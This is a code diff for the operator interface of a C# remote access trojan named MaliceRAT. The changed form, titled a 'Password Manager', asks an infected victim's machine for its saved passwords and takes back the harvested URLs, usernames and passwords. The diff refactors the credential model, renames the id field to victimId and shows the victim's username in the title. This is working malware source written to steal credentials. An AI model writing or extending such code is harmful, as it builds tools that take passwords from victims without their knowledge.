@@ -6,34 +6,36 @@ using MaliceRAT.RatServer;
 
 namespace MaliceRAT.RatUI
 {
-    public class CredentialModel
-    {
-        public string Url { get; set; }
-        public string Username { get; set; }
-        public string Password { get; set; }
-    }
-
     public partial class PasswordManagerForm : Form
     {
+        public class CredentialModel
+        {
+            public string Url { get; set; }
+            public string Username { get; set; }
+            public string Password { get; set; }
+        }
+
         #region Variables
-        private readonly int id;
+        private readonly int victimId;
         private readonly Server server;
         #endregion
 
         #region Constructor
-        public PasswordManagerForm(int id, Server server)
+        public PasswordManagerForm(int victimId, Server server)
         {
             InitializeComponent();
-            this.id = id;
+            this.victimId = victimId;
             this.server = server;
 
-            server.GetVictimById(id).Send(new { type = "request_passswords" });
+            server.GetVictimById(victimId).Send(new { type = "request_passswords" });
             server.MessageReceived += Server_MessageReceived;
+
+            titleLabel.Text = $"Password Manager [{server.GetVictimById(victimId).User}]";
         }
 
         private void Server_MessageReceived(Victim victim, dynamic message)
         {
-            if (victim.Id == id)
+            if (victim.Id == victimId)
             {
                 if (message["type"] == "passwords")
                 {
